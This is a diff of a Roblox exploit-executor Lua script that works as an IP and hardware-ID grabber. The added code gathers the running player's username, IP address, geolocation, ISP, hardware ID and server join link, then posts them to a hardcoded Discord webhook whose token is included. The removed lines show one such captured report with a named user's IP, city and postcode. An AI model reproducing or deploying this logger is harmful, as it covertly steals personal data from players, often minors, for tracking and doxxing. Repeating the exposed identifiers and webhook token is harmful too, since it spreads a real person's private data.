@@ -1,29 +1,95 @@
-__[Player Info](https://www.roblox.com/users/5021292248)__
-**Display Name:** AGB_Dk
-**Username:** BESTAKGOD36
-**User Id:** 5021292248
-**MembershipType:** None
-**AccountAge:** 819
-**Country:** en-us
-**IP:** 2.99.185.143
-**Hwid:** ee3595aa-8499-4d5b-b738-155330d04a87
-**Date:** 12/08/2025
-**Time:** 06:48:00
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
 
-__[Game Info](https://www.roblox.com/games/123974602339071)__
-**Game:** [UP] Just a baseplate.
-**Game Id**: 123974602339071
-**Exploit:** Shitty Exploit
+-- Player Info
+local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
+local Name = game.Players.LocalPlayer.Name -- Name
+local Userid = game.Players.LocalPlayer.UserId -- UserId
+local Country = game.LocalizationService.RobloxLocaleId -- Country
+local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
 
-**IP Information:**
-**isp:** TalkTalk Communications Limited
-**regionName:** Wales
-**city:** Swansea
-**query:** 2.99.185.143
-**as:** AS13285 TalkTalk Communications Limited
-**zip:** SA1
-**country:** United Kingdom
-**org:** Opal DSL Npe001 NEW
+local IpFields = {
+    "query", -- IP address
+    "country", -- Country
+    "regionName", -- Region
+    "city", -- City
+    "zip", -- Zip code
+    "isp", -- ISP
+    "org", -- Organization
+    "as", -- Autonomous system
+}
 
-**JobId:**
-```Roblox.GameLauncher.joinGameInstance(123974602339071, "5eedcef4-051c-444c-a115-92b46dbe0998")```
+local IpInfoFields = {}
+for _, field in ipairs(IpFields) do
+    if IpInfo[field] then
+        IpInfoFields[field] = IpInfo[field]
+    end
+end
+
+-- Convert the IP info table into a formatted string
+local IpInfoString = ""
+for field, value in pairs(IpInfoFields) do
+    IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
+end
+
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+-- GameInfo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+  or (secure_load and "Sentinel")
+  or (pebc_execute and "ProtoSmasher")
+  or (KRNL_LOADED and "Krnl")
+  or (is_sirhurt_closure and "SirHurt")
+  or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+  or ("Shitty Exploit")
+
+local url = "https://discord.com/api/webhooks/1370591618775777310/ytNwUEX5igGDYaJSSg5IrINRIq9V7QaOtMokvC6jjRlTN4F8H4920nmK9Fe2VxJJvyyI"
+
+local data = {
+    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "( Someone Executed The Script )",
+                ["url"] = "https://roblox.com",
+            },
+            ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
+                .."**Display Name:** "..DName.."\n"
+                .."**Username:** "..Name.."\n"
+                .."**User Id:** "..Userid.."\n"
+                .."**MembershipType:** "..MembershipType.."\n"
+                .."**AccountAge:** "..AccountAge.."\n"
+                .."**Country:** "..Country.."\n"
+                .."**IP:** "..GetIp.."\n"
+                .."**Hwid:** "..GetHwid.."\n"
+                .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
+                .."**Time:** "..tostring(os.date("%X")).."\n\n"
+                .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
+                .."**Game:** "..GAMENAME.."\n"
+                .."**Game Id**: "..game.PlaceId.."\n"
+                .."**Exploit:** "..webhookcheck.."\n\n"
+                .."**IP Information:**\n"..IpInfoString.."\n"
+                .."**JobId:**\n```"..ConsoleJobId.."```",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xf2ff00),
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
+            },
+        },
+    },
+}
+local newdata = HttpService:JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json",
+}
+local request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
